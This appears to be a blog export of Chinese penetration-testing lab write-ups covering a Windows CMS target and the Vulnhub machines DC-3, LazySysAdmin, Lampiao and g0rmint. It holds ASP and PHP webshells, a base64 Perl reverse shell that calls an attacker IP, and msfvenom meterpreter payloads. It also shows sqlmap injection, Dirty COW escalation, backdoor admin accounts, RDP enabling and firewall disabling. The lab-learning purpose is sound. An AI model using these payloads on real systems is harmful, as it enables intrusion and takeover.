\xC4\xCF\xB7\xBD\xCA\xFD\xBE\xDD\xC6\xF3\xD2\xB5\xCD\xF8\xD5\xBE\xB9\xDC\xC0\xED\xCF\xB5\xCD\xB3135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn445/tcp open microsoft-ds Windows Server 2008 R2 Datacenter 7601 Service Pack 1 microsoft-ds| ssl-cert: Subject: commonName=WIN-1DT2786LMA0| Not valid before: 2019-06-02T11:44:10|_Not valid after: 2019-12-02T11:44:10|_ssl-date: 2019-06-06T12:36:55+00:00; +2s from scanner time.49152/tcp open msrpc Microsoft Windows RPC49153/tcp open msrpc Microsoft Windows RPC49154/tcp open msrpc Microsoft Windows RPC49155/tcp open msrpc Microsoft Windows RPC49156/tcp open msrpc Microsoft Windows RPC49157/tcp open msrpc Microsoft Windows RPCMAC Address: 00:0C:29:96:7E:A1 (VMware)Device type: general purposeRunning: Microsoft Windows 7|2008|8.1OS CPE: cpe:/o:microsoft:windows_7::- cpe:/o:microsoft:windows_7::sp1 cpe:/o:microsoft:windows_server_2008::sp1 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows_8.1OS details: Microsoft Windows 7 SP0 - SP1, Windows Server 2008 SP1, Windows Server 2008 R2, Windows 8, or Windows 8.1 Update 1Network Distance: 1 hopService Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windowsHost script results:|_clock-skew: mean: -1h59m58s, deviation: 4h00m00s, median: 1s|_nbstat: NetBIOS name: WIN-1DT2786LMA0, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 00:0c:29:96:7e:a1 (VMware)| smb-os-discovery: | OS: Windows Server 2008 R2 Datacenter 7601 Service Pack 1 (Windows Server 2008 R2 Datacenter 6.1)| OS CPE: cpe:/o:microsoft:windows_server_2008::sp1| Computer name: WIN-1DT2786LMA0| NetBIOS computer name: WIN-1DT2786LMA0\x00| Workgroup: WORKGROUP\x00|_ System time: 2019-06-06T20:36:55+08:00| smb-security-mode: | account_used: guest| authentication_level: user| challenge_response: supported|_ message_signing: disabled (dangerous, but default)| smb2-security-mode: | 2.02: |_ Message signing enabled but not required| smb2-time: | date: 2019-06-06 08:36:56|_ start_date: 2019-06-06 08:16:59TRACEROUTEHOP RTT ADDRESS1 0.41 ms 192.168.64.139OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 77.67 seconds 445端口考虑是否存在ms17-010漏洞，此处使用 nmap --script smb-vuln-ms17-010 192.168.64.139 探测发现445端口不存在漏洞，该系统存在补丁，无法利用； 80端口开启，存在http服务，考虑从web漏洞渗透 容器探测whatweb 192.168.64.139 经过搜索，该网站后台路径暴露，但后台主页显示的账号密码均为错误信息。 该网站系统为南方数据cms，从此从网络上搜索出漏洞资料，得到用户名及密码： username:admin password:roottoor GETSHELL登录后台后有三种思路： 上传文件 网站配置中插入asp一句话 数据库备份拿webshell 经过验证，上传文件无法上传asp、aspx文件；网站配置插入一句话导致网站崩溃。 因而这里采取数据库备份： 首先将asp一句话木马的后缀修改位合法后缀名，例如：ok.png； 完成后上传该文件，记录上传后的路径：UploadFiles/20196621207602.png 123456&lt;%Function MorfiCoder(Code)MorfiCoder=Replace(Replace(StrReverse(Code),&quot;/*/&quot;,&quot;&quot;&quot;&quot;),&quot;\*\&quot;,vbCrlf)End FunctionExecute MorfiCoder(&quot;)/*/z/*/(tseuqer lave&quot;)%&gt; 打开系统管理-&gt;数据库备份，如图操作： 原理：此处数据库备份将原文件覆盖重写，将ok.png修改为shell.asp 访问该文件，并连接蚁剑，发现权限为：iis apppool\nfsj，需要进一步提权。 提权 利用msf生成后门程序，将该程序上传至服务器上 1234567msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.64.121 lport=8888 -f exe &gt; /root/Desktop/load.exeuse exploit/multi/handlerset payload windows/meterpreter/reverse_tcpset lhost 192.168.64.121set port 8888run 完成后在蚁剑虚拟终端中执行该文件，在msf中会接收到会话，自动进入meterpreter 【需要使用的几个命令】 sessions:查看接收到的session session -i [id]:进入到指定id的session中 background:后台挂起该会话 execute -f cmd.exe -:调用目标系统的cmd getsystem:使用默认一些方法提（不一定成功） 上传提权EXP:CVE-2018-8639，并在cmd中执行该exp(webshell中没有回显) 注意，该exp极不稳定，运行后显示以下信息，表示已经开始运行 执行过程中不断whoami查看权限变化： 取得系统权限后，创建账号并加入管理员组 12net user admin abc123ABC /adnet localgroup administrators admin /add 成功后发现3389端口并未开启，这里采取以下办法开启3389——参考文章 12345678echo Windows Registry Editor Version 5.00 &gt;3389.regecho. &gt;&gt;3389.regecho [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server] &gt;&gt;3389.regecho "fDenyTSConnections"=dword:00000000 &gt;&gt;3389.regecho [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp] &gt;&gt;3389.regecho "PortNumber"=dword:00000d3d &gt;&gt;3389.regecho [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp] &gt;&gt;3389.regecho "PortNumber"=dword:00000d3d &gt;&gt;3389.reg 再在提权状态下，cmd中输入：regedit /s 3389.reg 执行 【这个exp运行初期考人品，但是后期会发现存在规律~在卡顿的那空白一行中输入不会出现错误】 关闭防火墙： 1netsh firewall set opmode mode=disable 然后3389开启，远程登录即可~ kali远程协助：rdesktop -u admin -p abc123ABC -g 1024*720 192.168.64.139 Windows远程协助：mstsc 参考文章 msf生成常用payload 正向与反向反弹shell]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>提权</tag>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DC-3渗透实战]]></title>
    <url>%2F2019%2F08%2F16%2FDC-3%2F</url>
    <content type="text"><![CDATA[前言难度中，涉及到Joomla! CMS、john 渗透信息收集netdiscover -r 192.168.64.0/24 nmap -A 192.168.64.156 目录扫描=&gt; http://192.168.64.157/administrator/，发现为Joomla! CMS 使用JoomScan工具检测 1perl joomscan.pl -u http://192.168.64.157/ sql注入12searchsploit joomla | grep 3.7 cat /usr/share/exploitdb/platforms/php/webapps/42033.txt 12##########################################payload########################################sqlmap -u "http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering] 爆表： 1sqlmap -u "http://192.168.64.157/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D joomladb --tables 爆字段： 1sqlmap -u "http://192.168.64.157/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D joomladb -T "#__users" --columns dump： 1sqlmap -u "http://192.168.64.157/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D joomladb -T "#__users" --dump 账号：admin 密码：$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu hash破解12vim hash #写入密码john --wordlist=/usr/share/john/password.lst ./hash GETSHELL登录后台（U:admin、P:snoop） 选取模板管理，编辑index.php文件 sf反弹shell1234567msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.64.131 LPORT=4444 -f raw &gt; shell.php#########################################################################################use exploit/multi/handlerset PAYLOAD php/meterpreter_reverse_tcpset LHOST 192.168.88.128set LPORT 4444run 提权查看系统信息： 123cat /proc/versionuname -alsb_release -a exp： 搜寻提权exp要有耐心，很多exp是用不了的…… 123456#将exp移动至/var/www/html/cp /usr/share/exploitdb/exploits/linux/local/39772.txt /var/www/html/39772.txt#kali开启Apache/etc/init.d/apache2 start#下载至本机wget http://192.168.64.131/39772.txt 根据txt文件中描述，获取到exp: 上传至服务器，执行： 1234567891011=&gt;./compile.sh=&gt;./doubleputstarting writevwoohoo, got pointer reusewritev returned successfully. if this worked, you'll have a root shell in &lt;=60 seconds.suid file detected, launching rootshell...we have root privs now...^?bash: line 1: $'\177': command not found=&gt;iduid=0(root) gid=0(root) groups=0(root),33(www-data) 拓展 渗透过程中了解到或复习到的小知识点，记录下面便于今后查阅 Ubuntu开启ssh 安装opensshsudo apt-get install openssh-server 查看ssh状态ps -aux|grep ssh 启动服务service ssh start Ubuntu用户管理(普通用户-&gt;root) 创建用户 useradd test 设置密码 passwd test 修改/etc/passwd：root权限下修改uid：0 用户加入sudo组：在/etc/sudoers文件里给该用户添加权限 12345#root权限设置chmod u+w /etc/sudoersvi /etc/sudoers #找到这行 root ALL=(ALL) ALL,在他下面添加xxx ALL=(ALL) ALL (这里的xxx是你的用户名)chmod u-w /etc/sudoers John破解Linux密码教程 破解Linux下passwd、shadow中的密码 123456#合并passwd和shadowunshadow /etc/passwd /etc/shadow &gt; shadow#使用密码字典进行爆破john --wordlist=/usr/share/john/password.lst --rules shadow#不使用密码字典爆破john shadow 注意 john工具对于同一个shadow文件只会进行一次爆破，如果第二次执行john shadow是不会得到结果的 因此，查看上一次爆破结果：john --show shadow 参考文章使用john进行密码爆破 DC-3渗透实战]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>提权</tag>
        <tag>vulnhub</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[LazySysAdmin渗透实战]]></title>
    <url>%2F2019%2F08%2F10%2FLazySysAdmin%2F</url>
    <content type="text"><![CDATA[前言涉及：WordPress、Samba协议、enuml4inux和wpscan 难度中 渗透测试主机发现（1）netdiscover netdiscover是基于ARP的网络扫描工具 ARP是将IP地址转化物理地址的网络协议。通过该协议，可以判断某个IP地址是否被使用，从而发现网络中存活的主机。Kali Linux提供的netdiscover工具，就是借助该协议实施主机发现。它既可以以被动模式嗅探存活的主机，也可以以主动模式扫描主机。用户还可以根据网络稳定性，调整发包速度和数量。 payload:netdiscover -r 192.168.64.0/24 （2）nmap payload:nmap -sP 192.168.64.0/24 端口扫描payload:nmap -A -oN /root/Desktop/Lazysysadmin_info.csv 192.168.64.143 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667# Nmap 7.70 scan initiated Tue Jul 30 06:25:24 2019 as: nmap -A -oN /root/Desktop/Lazysysadmin_info.csv 192.168.64.143Nmap scan report for 192.168.64.143Host is up (0.00064s latency).Not shown: 994 closed portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 1024 b5:38:66:0f:a1:ee:cd:41:69:3b:82:cf:ad:a1:f7:13 (DSA)| 2048 58:5a:63:69:d0:da:dd:51:cc:c1:6e:00:fd:7e:61:d0 (RSA)| 256 61:30:f3:55:1a:0d:de:c8:6a:59:5b:c9:9c:b4:92:04 (ECDSA)|_ 256 1f:65:c0:dd:15:e6:e4:21:f2:c1:9b:a3:b6:55:a0:45 (ED25519)80/tcp open http Apache httpd 2.4.7 ((Ubuntu))|_http-generator: Silex v2.2.7| http-robots.txt: 4 disallowed entries |_/old/ /test/ /TR2/ /Backnode_files/|_http-server-header: Apache/2.4.7 (Ubuntu)|_http-title: Backnode139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)445/tcp open netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)3306/tcp open mysql MySQL (unauthorized)6667/tcp open irc InspIRCd| irc-info: | server: Admin.local| users: 1| servers: 1| chans: 0| lusers: 1| lservers: 0| source ident: nmap| source host: 192.168.64.131|_ error: Closing link: (nmap@192.168.64.131) [Client exited]MAC Address: 00:0C:29:DE:C8:B4 (VMware)Device type: general purposeRunning: Linux 3.X|4.XOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4OS details: Linux 3.2 - 4.9Network Distance: 1 hopService Info: Hosts: LAZYSYSADMIN, Admin.local; OS: Linux; CPE: cpe:/o:linux:linux_kernelHost script results:|_clock-skew: mean: -8d02h13m08s, deviation: 5h46m24s, median: -7d22h53m09s|_nbstat: NetBIOS name: LAZYSYSADMIN, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)| smb-os-discovery: | OS: Windows 6.1 (Samba 4.3.11-Ubuntu)| Computer name: lazysysadmin| NetBIOS computer name: LAZYSYSADMIN\x00| Domain name: \x00| FQDN: lazysysadmin|_ System time: 2019-07-22T21:32:29+10:00| smb-security-mode: | account_used: guest| authentication_level: user| challenge_response: supported|_ message_signing: disabled (dangerous, but default)| smb2-security-mode: | 2.02: |_ Message signing enabled but not required| smb2-time: | date: 2019-07-22 07:32:29|_ start_date: N/ATRACEROUTEHOP RTT ADDRESS1 0.64 ms 192.168.64.143OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Tue Jul 30 06:25:48 2019 -- 1 IP address (1 host up) scanned in 23.64 seconds 从中可看出： 22端口——ssh远程登录协议 80端口——http服务 139端口——NETBIOS Session Service端口,用于提供文件共享服务,主要用于企业内部网之间互相访问,如文件共享或打印等等. 445端口——有了它我们可以在局域网中轻松访问各种共享文件夹或共享打印机 3306端口——mysql服务 6667端口——一种透过网络的即时聊天方式。其主要用于群体聊天，但同样也可以用于个人对个人的聊天。 enum4linux扫描 Windows平台上曾经出现过一个第三方的信息枚举工具 enum.exe，其利用SMB协议枚举Windows系统和SAMBA服务，以此来获得目标系统大量的重要信息，其枚举结果可能包含目标系统的用户帐号、组帐号、共享目录、密码策略等机密重要信息。enum4linux作为其Linux平台的复刻作品，全面兼容了enum.exe的所有功能。对于安全防护不足的SMB/SAMBA服务，enum4linux可直接枚举重要信息，甚至帮助我们发现潜在漏洞的存在。 payload:enum4linux 192.168.64.143 获取到远程主机共享了print和share两个文件夹。 web目录扫描 可看出，主要web应用有phpMyAdmin和WordPress WPScan扫描参考文章：WPScan使用攻略 采用Ruby编写，能够扫描WordPress网站中的多种安全漏洞，其中包括主题漏洞、插件漏洞和WordPress本身的漏洞。最新版本WPScan的数据库中包含超过18000种插件漏洞和2600种主题漏洞，并且支持最新版本的WordPress。值得注意的是，它不仅能够扫描类似robots.txt这样的敏感文件，而且还能够检测当前已启用的插件和其他功能。 扫描WordPress站点:wpscan -u http://192.168.64.143/wordpress/ 仅获得服务器的基本信息（PHP版本、Apache以及系统的信息），并没有其他的插件，不存在漏洞利用点。 枚举WordPress用户：wpscan -u http://192.168.64.143/wordpress/ --enumerate u Web站点信息（1）togie可能是什么的账户名 （2）WPScan枚举出admin和ulgrmbcg两个用户名 Samba协议登录由上面enumlinux扫描获取到两个共享文件夹，访问: windows下:\\192.168.64.143\share$ linux下:smbclient //192.168.64.143/share$ 经简单审计WordPress的源码，发现信息： wp-config.php 1234567define('DB_NAME', 'wordpress');/** MySQL database username */define('DB_USER', 'Admin');/** MySQL database password */define('DB_PASSWORD', 'TogieMYSQL12345^^');/** MySQL hostname */define('DB_HOST', 'localhost'); 获得数据库的用户与密码，登录phpMyAdmin发现权限受限，无法利用。 deets.txt 123CBF Remembering all these passwords.Remember to remove this file and update your password after we push out the server.Password 12345 可能为某种服务的密码 SSH登录(方法1)尝试ssh togie@192.168.64.143 输入password:12345 togie权限很低，但是发现具有sudo权限 sudo是linux系统管理指令，是允许系统管理员让普通用户执行一些或者全部的root命令的一个工具 输入sudo su，成功提权…… web渗透(方法2)整理前面获取的信息: 未知的密码12345 未知的用户名togie 数据库的用户名Admin，密码TogieMYSQL12345^^ （1）WordPress后台登录:http://192.168.64.143/wordpress/wp-login.php 尝试用户名Admin，密码TogieMYSQL12345^^，登录成功，进入到WordPress后台 （2）点击插件-&gt;编辑-&gt;选择Hello Dolly Hello Dolly不是普通的插件，它象征着一代人希望和热情，浓缩成Louis Armstrong的四个字：你好，多莉。在启用后，在您站点后台每个页面的右上角都可以看到一句来自《俏红娘》音乐剧的英文原版台词 （3）修改hello.php文件，在末尾添加file_put_contents(‘shell.php’,’&lt;?php eval($_POST[pass]);?&gt;’); 在当前目录下生成webshell，蚁剑连接即可 （4）上传反弹shell脚本 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253&lt;?phpfunction which($pr) &#123;$path = execute("which $pr");return ($path ? $path : $pr);&#125;function execute($cfe) &#123;$res = '';if ($cfe) &#123;if(function_exists('exec')) &#123;@exec($cfe,$res);$res = join("\n",$res);&#125; elseif(function_exists('shell_exec')) &#123;$res = @shell_exec($cfe);&#125; elseif(function_exists('system')) &#123;@ob_start();@system($cfe);$res = @ob_get_contents();@ob_end_clean();&#125; elseif(function_exists('passthru')) &#123;@ob_start();@passthru($cfe);$res = @ob_get_contents();@ob_end_clean();&#125; elseif(@is_resource($f = @popen($cfe,"r"))) &#123;$res = '';while(!@feof($f)) &#123;$res .= @fread($f,1024);&#125;@pclose($f);&#125;&#125;return $res;&#125;function cf($fname,$text)&#123;if($fp=@fopen($fname,'w')) &#123;@fputs($fp,@base64_decode($text));@fclose($fp);&#125;&#125;$yourip = "192.168.64.131"; //修改这里$yourport = "4444"; // 修改这里$usedb = array('perl'=&gt;'perl','c'=&gt;'c');$back_connect="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj"."aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR"."hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT"."sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI"."kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi"."KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl"."OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw==";cf('/tmp/.bc',$back_connect);$res = execute(which('perl')." /tmp/.bc $yourip $yourport &amp;");?&gt; 访问后接受到shell 但经过尝试，如 python3 -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39; su togie 提示must be run from a terminal，没办法走方法2，从而使用方法1直接登陆ssh切换到管理员账号 参考文章 Vulnhub-LazySysAdmin 通关指南 带妹玩转Vulnhub【一】 Lazysysadmin渗透实战]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>提权</tag>
        <tag>vulnhub</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Lampiao渗透实战]]></title>
    <url>%2F2019%2F08%2F10%2FLampiao%2F</url>
    <content type="text"><![CDATA[前言常规型渗透、难度较小 渗透测试信息收集 IP 端口 netdiscover -r 192.168.64.0/24 ​ namp -A -oN nmap.txt 192.168.64.146 123456789101112131415PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.7 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 1024 46:b1:99:60:7d:81:69:3c:ae:1f:c7:ff:c3:66:e3:10 (DSA)| 2048 f3:e8:88:f2:2d:d0:b2:54:0b:9c:ad:61:33:59:55:93 (RSA)| 256 ce:63:2a:f7:53:6e:46:e2:ae:81:e3:ff:b7:16:f4:52 (ECDSA)|_ 256 c6:55:ca:07:37:65:e3:06:c1:d6:5b:77:dc:23:df:cc (EdDSA)80/tcp open http?MAC Address: 00:0C:29:70:1E:63 (VMware)Device type: general purposeRunning: Linux 3.X|4.XOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4OS details: Linux 3.2 - 4.8Network Distance: 1 hopService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel 访问80端口发现一个静态页面，且没有任何提示；怀疑开放了其他端口： nmap -sS -p 1-2000 192.168.64.146 -sS TCP SYN扫描 访问192.168.64.146:1898 web指纹 whatweb http://192.168.64.146:1898 根据网页下方版权亦可看出，站点CMS为Drupal web目录 获取会话（1）metasploit search Drupal 12use use exploit/unix/webapp/drupal_drupalgeddon2 options 1234set php_func systemset RHOSTS 192.168.64.146set rport 1898run GETSHELL msf的shell不是完整的shell，交互不完整； 恰好此处安装了python，可以使用python提供的pty模块，只需要一行脚本就可以创建一个原生虚拟终端 12shellpython -c 'import pty; pty.spawn("/bin/bash")' 提权首先获取系统信息 123456789www-data@lampiao:~/html$ ididuid=33(www-data) gid=33(www-data) groups=33(www-data)www-data@lampiao:~/html$ uname -auname -aLinux lampiao 4.4.0-31-generic #50~14.04.1-Ubuntu SMP Wed Jul 13 01:06:37 UTC 2016 i686 i686 i686 GNU/Linuxwww-data@lampiao:~/html$ cat /proc/versioncat /proc/versionLinux version 4.4.0-31-generic (buildd@lgw01-01) (gcc version 4.8.4 (Ubuntu 4.8.4-2ubuntu1~14.04.3) ) #50~14.04.1-Ubuntu SMP Wed Jul 13 01:06:37 UTC 2016 其次审计web源码，是否能从中获取一些有用信息 打包web源码:tar -czvf web.tar.gz ../html Linux tar命令用于备份文件。 tar是用来建立，还原备份文件的工具程序，它可以加入，解开备份文件内的文件。 -c 新建打包文件，同 -v 一起使用 查看过程中打包文件名-z 通过gzip方式压缩或解压，最后以.tar.gz 为后缀-v 压缩或解压过程中，显示出来过程-f 后面接要处理的文件-x 解决文件， -C 解压到对应的文件目录-t 列出备份文件的内容。 ########################################################################## 压缩：tar -czvf web.tar.gz ../html 解压：tar -xzvf web.tar.gz 列出压缩文件内容：tar -tzvf test.tar.gz WEB源码目录： 其中有用的信息: qrc.png =&gt;二维码 （加油信息） audio.m4a =&gt;音频信息 （user:tiago） /sites/default/settings.php =&gt;web配置文件 其中settins.php: 123456789101112131415$databases = array ( 'default' =&gt; array ( 'default' =&gt; array ( 'database' =&gt; 'drupal', 'username' =&gt; 'drupaluser', 'password' =&gt; 'Virgulino', 'host' =&gt; 'localhost', 'port' =&gt; '', 'driver' =&gt; 'mysql', 'prefix' =&gt; '', ), ),); 此处使用该账号信息进入到mysql，从user表中获取到Linux的账号信息 ps：此处应该可以尝试暴力破解，但加了salt很难破解，需要通过工具字典爆。 但通过网络教程来看，用户tiago的密码恰好为Virgulino，通过ssh登录成功。 通过脏牛提权 CVE-2016-5195 脏牛（Dirty COW） Linux内核&gt;=2.6.22（2007年发行）开始就受影响了，直到2016年10月18日才修复。 wget https://www.exploit-db.com/download/40847 12mv 40847 40847.cppg++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil 至此提权成功，获取到flag~ 总结记录下渗透过程传输文件的技巧 Linux系统之间传递文件:scp scp是linux系统下基于ssh登陆进行安全的远程文件拷贝命令，因此需要开启ssh服务 从本地传送到远程服务器 1.1传递文件 12scp local_file remote_username@remote_ip:remote_folder #不改变文件名scp local_file remote_username@remote_ip:remote_file #改变文件名 例:scp /root/Desktop/Lampiao/ test.php xm@192.168.64.128:/home/xm/桌面/test.php 1.2传递文件夹 1scp -r local_folder remote_username@remote_ip:remote_folder 例:scp -r /root/Desktop/Lampiao/ xm@192.168.64.128:/home/xm/桌面/ 从远程服务器传送到本地 顺序同上面相反 例： 12scp root@www.runoob.com:/home/root/others/music /home/space/music/1.mp3 scp -r www.runoob.com:/home/root/others/ /home/space/music/ wget 在攻击方服务器上开启web服务，将需要的文件放入web目录下，在靶机上相应目录wget下载下来即可。 参考文章 Linux tar命令 Linux scp命令 vulnhub|渗透测试lampiao 【漏洞预警】CVE-2016-5195 脏牛漏洞：Linux内核通杀提权漏洞（10.27 10:30更新）]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>提权</tag>
        <tag>vulnhub</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[g0rmint渗透实战]]></title>
    <url>%2F2019%2F08%2F10%2Fg0rmint%2F</url>
    <content type="text"><![CDATA[前言这里自动设置的是桥接，记得修改为NAT 靶机难度不大，但是细节上存在大量问题 渗透测试主机发现netdiscover:netdiscover -r 192.168.64.0/24 端口扫描 仅开放22与80端口，看样子需要从web层面进行渗透 Web信息收集（1）目录扫描 扫描器发现，网站根目录下存在robots.txt，打开提示/g0rmint/ 继续使用扫描器发现：login.php 介绍kali下的目录扫描工具:dirb dirb http://........... （2）页面信息 经过尝试并没有发现漏洞点，查看源码，发现一段提示: 这里相当无语，我的靶机里并没有这一行代码，但网络上的教程中是显示有的 访问后仍然404，但用扫描器发现了一些信息 dirb http://192.168.64.144/g0rmint/s3cretbackupdirect0ry/ 访问info.php，得到信息：backup.zip；成功下载获取源码 代码审计 想着登录到后台，从db.sql中找到了一条信息 1INSERT INTO `g0rmint` (`id`, `username`, `email`, `pass`) VALUES (1, 'demo', 'demo@example.com', 'fe01ce2a7fbac8fafaed7c982a04e229');` MD5解密=&gt;demo 但是发现无法登录，可能是该信息是最原始的密码。 查看reset.php: 密码是截取gmdate()函数生成的日期的前20位，再先后加密得到的 而修改密码需要提供账户名和邮箱名，使用db.sql中的信息失败 经网上教程提醒，全局搜索email，在某个css文件中查找到了这条信息： 修改登录，最终成功登录进入后台： getshell发现后台并没有什么利用点，继续审查代码 在login.php中可以看到 1234567891011121314151617181920212223&lt;?phpinclude_once('config.php');if (isset($_POST['submit'])) &#123; // If form is submitted $email = $_POST['email']; $pass = md5($_POST['pass']); $sql = $pdo-&gt;prepare("SELECT * FROM g0rmint WHERE email = :email AND pass = :pass"); $sql-&gt;bindParam(":email", $email); $sql-&gt;bindParam(":pass", $pass); $row = $sql-&gt;execute(); $result = $sql-&gt;fetch(PDO::FETCH_ASSOC); if (count($result) &gt; 1) &#123; session_start(); $_SESSION['username'] = $result['username']; header('Location: index.php'); exit(); &#125; else &#123; $log = $email; $reason = "Failed login attempt detected with email: "; addlog($log, $reason); &#125;&#125;?&gt; 其中addlog()定义位于config.php: 1234567891011121314function addlog($log, $reason) &#123; $myFile = "s3cr3t-dir3ct0ry-f0r-l0gs/" . date("Y-m-d") . ".php"; if (file_exists($myFile)) &#123; $fh = fopen($myFile, 'a'); fwrite($fh, $reason . $log . "&lt;br&gt;\n"); &#125; else &#123; $fh = fopen($myFile, 'w'); fwrite($fh, file_get_contents("dummy.php") . "&lt;br&gt;\n"); fclose($fh); $fh = fopen($myFile, 'a'); fwrite($fh, $reason . $log . "&lt;br&gt;\n"); &#125; fclose($fh);&#125; 可见，当登录失败时，email信息将会被写入到php文件中，即可写入一句话，成功获取webshell 提权查看系统信息 12uname -acat /proc/version 版本信息为：Ubuntu 16.04，存在一种本地提权的方法 参考文章： Ubuntu16.04 本地提权漏洞复测过程 【漏洞复现】Ubuntu本地提权漏洞CVE-2017-16995 这里又是一个坑点，我无论用何种exp，都会提醒各种错误，这个过程花了一个上午，最终还不知道是怎么成功的…但不管怎么说，这几种exp在webshell的虚拟终端是无法执行成功的，需要反弹shell 反弹shell此处给出本例使用过的两种通过metasploit反弹的方式 二进制文件 1msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf 123456msfconsoleuse exploit/multi/handlerset payload linux/x86/meterpreter/reverse_tcpset lhost 192.168.64.131set lport 4444exploit PHP文件 1msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.php 12345use exploit/multi/handlerset payload php/meterpreter_reverse_tcpset lhost 192.168.64.131set lport 4444exploit 由于目标服务器没有gcc，于是在本地Linux系统中生成exp： 1gcc -c exp.c -o exp 将exp上传至目标服务器中，在msf shell中执行，成功提权： 在/root/目录下获取到flag 至此，渗透实验基本完成。 我这里额外添加了一个普通用户，并将它加入到管理员和sudo组 12345useradd hackerpasswd hackerusermod -s /bin/bash hackerusermod -g root hackerusermod -aG sudo hacker 这里因为在msf shell中，不能顺利的修改文件，这里没有完全将普通用户提升为root权限。 12id hackeruid=1001(hacker) gid=0(root) groups=0(root),27(sudo) 杂记 这个靶机因为提权exp的问题耗费了太多的时间精力，还专门去下了一个相同版本的Ubuntu来gcc编译，然后……生成的exp仍然不行 但这个过程中利用到了更换Linux内核，有必要在这里记录一下 uname -r 查看系统默认内核 apt-cache search linux 查看可获取的内核 sudo apt-get install linux-headers-4.4.0-62-generic linux-image-4.4.0-62-generic 安装所需要版本的内核，注意:这一步需要下载两个东西，”headers”和”image”，不能只安装其中一个 sudo gedit /boot/grub/grub.cfg 修改内核配置信息 保存后重启即可 参考文章: 【漏洞复现】Ubuntu本地提权漏洞CVE-2017-16995 ubuntu如何安装或更换内核 Ubuntu下更换内核详细步骤（亲测有效） 参考文章 记一次在实战靶机中使用SearchSploit的总结 Vulnhub-g0rmint 带妹玩转Vulnhub【二】 msf生成常用payload 记一次在实战靶机中使用SearchSploit的总结]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
